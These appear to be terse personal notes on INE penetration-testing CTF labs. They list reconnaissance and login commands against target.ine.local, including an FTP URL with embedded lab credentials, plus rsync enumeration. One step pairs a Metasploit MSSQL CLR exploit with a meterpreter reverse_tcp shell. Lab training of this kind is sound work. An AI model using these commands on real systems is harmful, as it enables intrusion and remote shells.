#### Assessment Methodologies: Information Gathering CTF 1
whatweb, nmap, httrack
wpscan --url target.ine.local  

#### Assessment Methodologies: Footprinting and Scanning CTF 1
mysqlshow -h target.ine.local  -P3306 -u db_admin --password  

#### Assessment Methodologies: Enumeration CTF 1
Find share using wordlist. Wild guess, first try.
smb_login
smbclient  \\\\target.ine.local\\josh -U josh   

portscan/tcp
ftp/ftp_version
ftp/ftp_login

ftp ftp://alice:pretty@target.ine.local:5554

ssh a@target.ine.local 22       

#### Host & Network Penetration Testing: System-Host Based Attacks CTF 1
Ez

#### Host & Network Penetration Testing: System-Host Based Attacks CTF 2
Ez?

#### Network
Search in strings in wireshark

#### Host & Network Penetration Testing: The Metasploit Framework CTF 1
Use `exploit/windows/mssql/mssql_clr_payload`
Change the payload to `windows/x64/meterpreter/reverse_tcp`
`search -f *flag* -r`

#### Host & Network Penetration Testing: The Metasploit Framework CTF 2
```
rsync <target-ip>::
rsync -av 192.120.27.3::backupwscohen tester
search roxy_wi

```
